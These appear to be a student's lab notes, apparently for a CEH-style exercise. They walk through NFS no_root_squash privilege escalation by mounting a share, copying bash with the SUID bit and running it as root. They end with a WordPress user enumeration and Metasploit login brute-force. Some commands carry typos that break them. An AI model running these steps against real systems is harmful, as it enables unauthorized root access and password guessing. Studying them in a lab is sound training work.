
vulnerability : Nfs squash method
if you have time Follow this tutorial only
https://juggernaut-sec.com/nfs-no_root_squash/#Example_1_Crafting_an_Exploit_for_a_Root_Shell
or
### Perform vertical privilege escalation of a root user, and enter the flag
Exploiting misconfigured NFS (port 2049)

* `nmap -sV —p 2049 IP/Subnet`
* `sudo apt-get install nfs-common`
* `nmap -sV —script=nfs-showmount <Target_IP>`
* check available mounts: `showmount -e <Target_IP>` -> we will see /home directory
* `mkdir /tmp/nfs`
* `sudo mount -t nfs 10.10.1.9:/home /tmp/nfs`
* `cd /tmp/nfs`
* `sudo cp /bin/bash .`
* `sudo chmod +s bash` -> it will be highlighted in red
* `ls -la`
* `sudo df -h`
* `sudo chmod +s bash`

after them, In another terminal:

* Access to target using SSH
ssh smith@192.168.0.x
* `./bash -p` and we're root!
* `cd /home`
* `ls -la`


	#Windows cmds 

		Net  user
        Snow.exe -C -p “given_password” file_name
        —---------------------

        -wpscan --url http://10.10.10.12:8080/CEG --enumerate u
        msfconsole
        use axiliary/scanner/http/wordpress_login_enum
        PASS_FILE /root/Desktop/wordlists/Passwords.txt
        set RHOSTs 10.10.10.12
        set RPORT 8080
        set TARGETURI http://10.10.10.12:8080/CEH/
        set USERNAME admin
        run